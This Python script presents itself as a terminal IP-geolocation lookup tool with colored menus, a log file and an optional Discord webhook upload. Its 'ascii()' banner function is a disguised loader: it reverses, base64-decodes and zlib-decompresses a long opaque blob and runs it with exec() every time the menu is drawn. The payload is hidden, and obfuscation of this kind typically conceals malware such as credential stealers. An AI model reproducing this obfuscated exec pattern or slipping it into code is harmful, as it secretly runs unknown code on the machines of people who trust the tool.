import json 
import requests 
import time
import os 
import datetime


def ascii():              
 _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))

class colors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    LIGHT_GRAY = '\033[37m'
    DARK_GRAY = '\033[90m'
    LIGHT_RED = '\033[91m'
    LIGHT_GREEN = '\033[92m'
    LIGHT_YELLOW = '\033[93m'
    LIGHT_BLUE = '\033[94m'
    LIGHT_MAGENTA = '\033[95m'
    LIGHT_CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    HIDDEN = '\033[8m'
    STRIKETHROUGH = '\033[9m'
    DOUBLE_UNDERLINE = '\033[21m'
    NORMAL_COLOR = '\033[22m'
    NORMAL_INTENSITY = '\033[22m'
    RESET_UNDERLINE = '\033[24m'
    RESET_BLINK = '\033[25m'
    RESET_REVERSE = '\033[27m'
    RESET_HIDDEN = '\033[28m'
    RESET_STRIKETHROUGH = '\033[29m'
    ORANGE = '\033[38;5;214m'  # Light Orange
    PURPLE = '\033[38;5;141m'  # Light Purple
    TEAL = '\033[38;5;37m'     # Teal
    PINK = '\033[38;5;206m'    # Light Pink
    LIME = '\033[38;5;154m'    # Lime Green
    CYAN_BLUE = '\033[38;5;39m'  # Cyan Blue
    DARK_GREEN = '\033[38;5;22m'  # Dark Green
    SKY_BLUE = '\033[38;5;111m'  # Sky Blue
    DARK_ORANGE = '\033[38;5;166m'  # Dark Orange
    INDIGO = '\033[38;5;57m'   # Indigo
    GRAY = '\033[38;5;242m'    # Light Gray
    MAROON = '\033[38;5;52m'   # Maroon
    OCEAN_BLUE = '\033[38;5;21m'  # Ocean Blue
    GOLD = '\033[38;5;220m'    # Gold
def clear():
    try:
     os.system('cls')
    except:
      os.system('clear')
clear()
while True:
 clear()
 def checkip(iptocheck):
    try:
     url = (f'http://ip-api.com/json/{iptocheck}')
     sendingiptotrack = requests.get(url=url)
     ipdata = json.loads(sendingiptotrack.text)
     result=(f"\n\n\nCountry: {ipdata['country']} \nCountry Code: {ipdata['countryCode']} \nRegion: {ipdata['region']} \nRegion Name: {ipdata['regionName']} \nCity: {ipdata['city']} \nZIP Code: {ipdata['zip']} \nLAT & LON: {ipdata['lat']}{ipdata['lon']}  \nTime Zone: {ipdata['timezone']} \nISP: {ipdata['isp']} \nOrganisation: {ipdata['org']} \nAS: {ipdata['as']} \nquery: {ipdata['query']}")
     print(result)
     with open('logs.txt', 'a') as logs:
       logs.write(f"{'-' * 30}\nIP CHECKED ---- > {iptocheck}\nTIME : [{datetime.datetime.now()}]\n{result}\n{'-' * 30}\n\n")
    except Exception as e:
      print(f'{colors.RED}An error Occured : {e} ')

 # The First Interface
 ascii()
 print(' \n\n\n'+colors.LIGHT_GREEN+'[1] Your IP \n'+colors.ORANGE+'[2] Specific IP\n'+colors.PURPLE+'[3] LOGS Settings')
 choiceinput=int(input(f'\n{colors.SKY_BLUE}[X] Your Choice : '))
 # Checking the CHOICE of the user
 if choiceinput == 1:
    myip=requests.post('https://api.myip.com')
    jsonmyipdata=json.loads(myip.text)
    myipaddress = jsonmyipdata['ip']
    iptocheck=myipaddress
    checkip(iptocheck=iptocheck)
    input(f'{colors.LIGHT_GREEN}\n\n\nPress ENTER to Check Again...')
    clear()
 elif choiceinput == 2:
   targetip=input('[+] Target IP : ')
   checkip(iptocheck=targetip)
   input(f'{colors.LIGHT_GREEN}\n\n\nPress ENTER to Check Again...')
   clear()
 elif choiceinput == 3:
   while True:
     clear()
     ascii()
     print(f'\n{colors.RED}[1] Clear Logs\n{colors.CYAN_BLUE}[2] Count Number if IPs Tracked\n{colors.ORANGE}[3] Upload Logs to a Discord WebHook\n{colors.LIGHT_YELLOW}[4] Go Back')
     logssettingschoice=int(input('\n[X] Your Choice : '))
     if logssettingschoice==1:
       try:
         with open('logs.txt', 'w') as logs:
          pass
          print(f'[+] {colors.GOLD}Logs File has been cleared Successfuly')
          input(f'{colors.LIGHT_GREEN}Press ENTER to go back...')
       except Exception as e:
         print(f'[X] Error Occured {e}')
     if logssettingschoice==2:
         with open('logs.txt', 'r') as logsfile:
           openinglogs=logsfile.read()
           logsresult=openinglogs.count('IP CHECKED ---- >')
           print(f'[+]{colors.LIME} Numbers of IPs checked is --> {logsresult}')
           input(f'{colors.LIGHT_GREEN}Press ENTER to go back...')
     if logssettingschoice==3:
       webhookurl=input(f'{colors.LIGHT_CYAN}Enter Your discord Webhook : ')
       with open('logs.txt', 'rb') as logstowebhook:
         files={'files': logstowebhook}
         response=requests.post(url=webhookurl,files=files)
         if response.status_code==200:
           print(f'{colors.LIGHT_GREEN}[+] Logs Uploaded Successfuly')
           input(f'{colors.LIGHT_GREEN}Press ENTER to go back...')
         else:
           print('An error occured while uploading logs to discord webhook')
           input(f'{colors.LIGHT_GREEN}Press ENTER to go back...')
     if logssettingschoice==4:
       break
 else:
    print(f'{colors.LIGHT_RED}[ERROR] Invalid Choice ')
    time.sleep(3)
    clear()
